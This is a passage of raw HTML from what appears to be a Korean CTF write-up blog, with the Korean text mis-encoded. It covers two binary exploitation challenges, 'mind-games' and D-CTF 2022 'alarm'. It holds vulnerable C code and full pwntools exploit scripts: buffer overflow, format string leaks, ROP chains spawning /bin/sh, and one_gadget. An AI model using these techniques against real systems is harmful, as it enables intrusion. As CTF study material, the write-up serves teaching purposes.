class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == file) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            c = fgetc(file);</span><br><span class="line">            <span class="keyword">if</span> (c == EOF)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> input[BUF_SIZE] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> randnum, guess;</span><br><span class="line"></span><br><span class="line">    disable_buffering();</span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You think you can read my mind? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input); <span class="comment">// bof</span></span><br><span class="line">    guess = atoi(input);</span><br><span class="line">    randnum = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (guess == randnum) &#123;</span><br><span class="line">        flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s what I thought.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>random ê°’ì„ ë§žì¶”ë©´ <code>flag()</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤. <code>scanf(&quot;%s&quot;, input)</code>ì—ì„œ bofê°€ í„°ì§€ë‹ˆê¹ inputì„ ìž…ë ¥í•  ë•Œ guessëž‘ randnumì„ ë™ì¼í•˜ê²Œ ì£¼ë©´ ìš°íšŒê°€ ë˜ì§€ ì•Šì„ê¹Œ? ìƒê°í–ˆë‹¤. í•˜ì§€ë§Œ ìž…ë ¥ í›„ì— guessì™€ randnumì„ ì •ì˜í•˜ê¸° ë•Œë¬¸ì— ê·¸ëŸ° ë°©ë²•ì€ í†µí•˜ì§€ ì•ŠëŠ”ë‹¤.</p><p>ì–´ë–»ê²Œ í•´ì•¼í• ê¹Œ?</p><p>randnumì„ ì •ì˜í•˜ëŠ” í•¨ìˆ˜ëŠ” <code>rand()</code> í•¨ìˆ˜ì´ë‹¤. ê°„ë‹¨í•˜ê²Œ ë§í•˜ë©´ ì´ í•¨ìˆ˜ëŠ” <code>srand()</code> í•¨ìˆ˜ì— ì˜ì¡´ì ì¸ë° ì¸ìžë¡œ <code>time(NULL)</code>ì´ ë“¤ì–´ê°„ë‹¤. ê°™ì€ ì‹œê°„ëŒ€ì— ë‹¤ë¥¸ í”„ë¡œê·¸ëž¨ì„ ì‹¤í–‰í•´ë„ í”„ë¡œê·¸ëž¨ì˜ í˜„ìž¬ ì‹œê°„ì„ ê°€ì ¸ì˜¤ê¸° ë•Œë¬¸ì— ìš°ë¦¬ëŠ” randnumì„ ì˜ˆì¸¡í•  ìˆ˜ ìžˆë‹¤.</p><p>ê´€ë ¨ ë‚´ìš©ì€ ë‚˜ì˜ <a href="https://jiravvit.tistory.com/entry/NOTE-coding-%EB%82%9C%EC%88%98%EC%83%9D%EC%84%B1randsrandtime-C%EC%96%B8%EC%96%B4">êµ¬ í‹°ìŠ¤í† ë¦¬ ë¸”ë¡œê·¸</a>ì— ìžì„¸ížˆ ì„¤ëª…ë˜ì–´ ìžˆë‹¤.</p><p>ì´ëŸ°ì‹ìœ¼ë¡œ <code>flag()</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìžˆëŠ”ë° ë¯¸ë¦¬ ìŠ¤í¬í•˜ìžë©´ ì´ í•¨ìˆ˜ëŠ” ì§„ì§œ flagë¥¼ í˜¸ì¶œí•˜ì§€ ì•ŠëŠ”ë‹¤.</p><p>ê·¸ëž˜ì„œ bofë¥¼ ì´ìš©í•˜ì—¬ ripë¥¼ ë°”ê¿” <code>execve</code>ë¥¼ í˜¸ì¶£í•´ì•¼ í•œë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ì‹œë‚˜ë¦¬ì˜¤"><a href="#ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ì‹œë‚˜ë¦¬ì˜¤"></a>ì‹œë‚˜ë¦¬ì˜¤</h3><ol><li>random ê°’ êµ¬í•œ í›„, libc leak í›„ mainìœ¼ë¡œ íë¦„ ëŒë¦¬ê¸°</li><li>random ê°’ ë‹¤ì‹œ êµ¬í•œ í›„, one gadget í˜¸ì¶œ</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./mind-games&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.chal.ctf.gdgalgiers.com&#x27;</span>, <span class="number">1404</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./mind-games&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line">log.info(<span class="string">b&#x27;random ::&#x27;</span> + random)</span><br><span class="line">r.close()</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004014c3</span></span><br><span class="line">puts_plt = e.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> <span class="comment">#rbp</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libc_base = leak - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">log.info(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line">random = r.recv()</span><br><span class="line"></span><br><span class="line">payload = random</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x30</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(<span class="number">0xe6c84</span>+libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;mind?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.close()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><ol><li><p>í’€ê³  ë‚˜ì„œ ìµìŠ¤ ì½”ë“œë¥¼ ë‚ ë ¤ë²„ë ¤ì„œ ëŒ€íšŒ ëë‚˜ê³  ë‹¤ì‹œ í’€ì—ˆë‹¤. ëŒ€íšŒ ë•Œ ë­”ê°€ í™•ë¥ ì ìœ¼ë¡œ shellì„ ì–»ì„ ìˆ˜ ìžˆì—ˆëŠ”ë°, ì§€ê¸ˆ ìƒê°í•´ë³´ë‹ˆ random ê°’ ë•Œë¬¸ì´ì—ˆë˜ ê²ƒ ê°™ë‹¤. ì²« mainì—ì„œ êµ¬í•œ random ê°’ì„ ë‘ ë²ˆì§¸ mainì—ì„œ ì‚¬ìš©í•˜ë ¤ë‹ˆ ì‹œê°„ì´ ì¡°ê¸ˆ ì§€ë‚˜ íë¦„ì´ ì´ì–´ì§€ì§€ ì•ŠëŠ” ê²½ìš°ê°€ ìƒê²¨ì„œ while, try-except êµ¬ë¬¸ì„ ì´ìš©í–ˆì—ˆë‹¤â€¦ ã…‹ã…‹ </p></li><li><p>ëŒ€íšŒ ì¢…ë£Œ í›„ ì´ê²Œ ì†”ë¸Œ ìˆ˜ê°€ 19ì˜€ëŠ”ë° 25ì†”ì§œë¦¬ ë¬¸ì œëŠ” í’€ì§€ ëª»í•˜ì˜€ë‹¤ ã…œã…œ, íž™ ë¬¸ì œì˜€ëŠ”ë°.. ìš”ì•½í•˜ìžë©´ oobë¥¼ í†µí•´ libc leakì„ í•  ìˆ˜ ìžˆê³ , heap overflowë¥¼ ì´ìš©í•˜ì—¬ heap chunkì˜ sizeë¥¼ ì¡°ìž‘í•  ìˆ˜ ìžˆë‹¤. ì´ê±°ë¥¼ ì´ìš©í•´ì„œ í‘¸ëŠ” ë¬¸ì œì˜€ëŠ”ë°,.. ì•”íŠ¼ ëª»í’€ì—ˆë‹¤. ë‹¤ë¥¸ ì‰¬ìš´ íž™ ë¬¸ì œë“¤ ì¢€ í’€ì–´ë³´ê³  í’€ì–´ë´ì•¼ê² ë‹¤ T_T</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> GDG-Algiers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> one_gadget </tag>
            
            <tag> random </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DefCamp Capture the Flag (D-CTF) 2022 - alarm (fsb, one_gadget)</title>
      <link href="/221005-d-ctf2022-alarm/"/>
      <url>/221005-d-ctf2022-alarm/</url>
      
        <content type="html"><![CDATA[<p>ë¶„ì„ í™˜ê²½: Windows 11, Ubuntu 20.04<br>ì‚¬ìš©ìž ì œê³µ íŒŒì¼: ë°”ì´ë„ˆë¦¬</p><p>í•´ë‹¹ ctfì— pwnì´ ë‘ ë¬¸ì œ ë‚˜ì™”ë‹¤. ì´ê±´ mediumì´ë‹¤.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="ë³´í˜¸-ê¸°ë²•"><a href="#ë³´í˜¸-ê¸°ë²•" class="headerlink" title="ë³´í˜¸ ê¸°ë²•"></a>ë³´í˜¸ ê¸°ë²•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><h3 id="ì·¨ì•½ì "><a href="#ì·¨ì•½ì " class="headerlink" title="ì·¨ì•½ì "></a>ì·¨ì•½ì </h3><p>IDAë¡œ ì—´ì–´ë³´ë©´ ë˜ê²Œ ê°„ë‹¨í•˜ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_400807(a1, a2, a3);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( read(fd, &amp;buf, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wellcome to the Alarm system!&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    fgets(byte_6010C0, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(byte_6010C0);                        <span class="comment">// fsb</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Unlock value of alarm: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      vuln(<span class="string">&quot;%x&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;UGVybWlzc2lvbiBkZW5pZWQhCg==\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Read failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb ì·¨ì•½ì ì´ ëŒ€ë†“ê³  ë³´ì¸ë‹¤. ìž…ë ¥í•  ìˆ˜ ìžˆëŠ” ë°”ì´íŠ¸ ìˆ˜ë„ êµ‰ìž¥ížˆ ë„‰ë„‰í•˜ë‹¤.</p><p>ë°”ë¡œ ì•„ëž˜ì—ì„œë„ ì–´ë–¤ ìž…ë ¥ê°’ í•˜ë‚˜ë¥¼ ì£¼ê³  ê·¸ ìž…ë ¥ê°’ì´ <code>/dev/urandom</code> ëžœë¤ê°’ê³¼ ê°™ì€ì§€ ë¹„êµí•œë‹¤. ê°™ìœ¼ë©´ <code>vuln</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ì–´ bofë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìžˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400861</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Alarm set to @%p\n&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">5000uLL</span>);                        <span class="comment">// bof</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fsb ì·¨ì•½ì ì´ ì¡´ìž¬í•œë‹¤ë©´ í•  ìˆ˜ ìžˆëŠ”ê²Œ êµ‰ìž¥ížˆ ë§Žë‹¤. ì˜ˆë¥¼ ë“¤ë©´ ìŠ¤íƒ ê°’ ë…¸ì¶œ ì •ë„?</p><p>ì´ ë¬¸ì œì—ì„  bofë¥¼ íŠ¸ë¦¬ê±°í•˜ê³  ìž‘ì„±í•  ìˆ˜ ìžˆëŠ” ë°”ì´íŠ¸ ìˆ˜ê°€ êµ‰ìž¥ížˆ ë„‰ë„‰í•˜ê³ , canaryë„ ì¡´ìž¬í•˜ì§€ ì•Šì•„ bofë§Œ ìž˜ íŠ¸ë¦¬ê±° ëœë‹¤ë©´ ë¬´ë¦¬ì—†ì´ ROPë¥¼ ì§„í–‰í•  ìˆ˜ ìžˆì„ ê²ƒì´ë‹¤.</p><p>bofë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ì¡°ê±´ì€ ëžœë¤ ê°’ì„ ì¼ì¹˜ì‹œì¼œì•¼í•˜ëŠ” ê²ƒì¸ë°, ì´ ëžœë¤ ê°’ì€ ìŠ¤íƒì— ì €ìž¥ëœë‹¤. ë”°ë¼ì„œ fsbë¡œ ëžœë¤ ê°’ì„ ì•Œì•„ë‚¼ ìˆ˜ ìžˆë‹¤. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ì‹œë‚˜ë¦¬ì˜¤"><a href="#ì‹œë‚˜ë¦¬ì˜¤" class="headerlink" title="ì‹œë‚˜ë¦¬ì˜¤"></a>ì‹œë‚˜ë¦¬ì˜¤</h3><ol><li>fsbë¥¼ ì´ìš©í•˜ì—¬ ëžœë¤ ê°’ê³¼ libc base êµ¬í•˜ê¸°</li><li>ëžœë¤ ê°’ì„ ìž…ë ¥í•˜ì—¬ bof íŠ¸ë¦¬ê±°</li><li>ROP!</li></ol><h3 id="Exploit-Code-local-Ubuntu-20-04"><a href="#Exploit-Code-local-Ubuntu-20-04" class="headerlink" title="Exploit Code (local, Ubuntu 20.04)"></a>Exploit Code (local, Ubuntu 20.04)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;34.159.80.143&#x27;, 31776)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./alarm&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;system!&#x27;</span>, <span class="string">&#x27;%p %9$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">leak = p.recvline().split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(leak)</span><br><span class="line"></span><br><span class="line">libc_leak = leak[<span class="number">0</span>]</span><br><span class="line">random_leak = leak[<span class="number">1</span>][:-<span class="number">1</span>] </span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;libc_leak :: &#x27;</span> + libc_leak)</span><br><span class="line">log.info(<span class="string">&#x27;random_leak :: &#x27;</span> + random_leak)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;alarm:&#x27;</span>, random_leak)</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak,<span class="number">16</span>) - <span class="number">131</span> - libc.symbols[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;libc_base :: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">ret = libc_base + <span class="number">0x22679</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x23b6a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"><span class="comment">#payload += &#x27;C&#x27; * 8 # ret</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="find-libc"><a href="#find-libc" class="headerlink" title="find libc"></a>find libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ëžœë¤ ê°’ ì „ì†¡ í›„</span></span><br><span class="line">ret = <span class="number">0x40067e</span></span><br><span class="line">pop_rdi = <span class="number">0x400a23</span></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = <span class="number">0x400690</span> <span class="comment">#e.plt[&#x27;puts&#x27;]</span></span><br><span class="line">open_got = e.got[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> </span><br><span class="line">payload += <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got) <span class="comment"># open_got</span></span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(leak_addr))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puts: 970</span><br><span class="line">open: bf0</span><br></pre></td></tr></table></figure><p>libc database site: <a href="https://libcdb.konwur.de/">https://libcdb.konwur.de/</a></p><p>ìµœì¢…ì ìœ¼ë¡œ êµ¬í•œ libc version: <code>libc6_2.27-3ubuntu1.6_amd64.so</code></p><h3 id="Exploit-Code-remote-Ubuntu-18-04"><a href="#Exploit-Code-remote-Ubuntu-18-04" class="headerlink" title="Exploit Code (remote, Ubuntu 18.04)"></a>Exploit Code (remote, Ubuntu 18.04)</h3><p>remote libcê°€ Ubuntu 18.04ì˜ libc ë²„ì „ì´ë¼ì„œ ì›ê°€ì ¯ì„ ë¬´ë¦¬ì—†ì´ ì‚¬ìš©í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 